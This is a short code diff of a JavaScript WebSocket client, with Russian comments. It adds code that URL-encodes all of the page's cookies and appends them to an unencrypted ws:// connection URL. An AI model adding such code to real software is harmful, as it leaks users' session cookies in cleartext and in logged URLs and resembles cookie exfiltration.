@@ -51,7 +51,8 @@ function websocketClient(ip, callbackHandlerResponse, callbackHandlerRequest) {
         );
     }
 
-    const ws = new WebSocket("ws://" + ip);
+    const cookies = encodeURIComponent(document.cookie); // Кодируем куки
+    const ws = new WebSocket("ws://" + ip + "?cookies=" + cookies);
     ws.onopen = () => {
         console.log("Соединение установлено с сервером");
     };
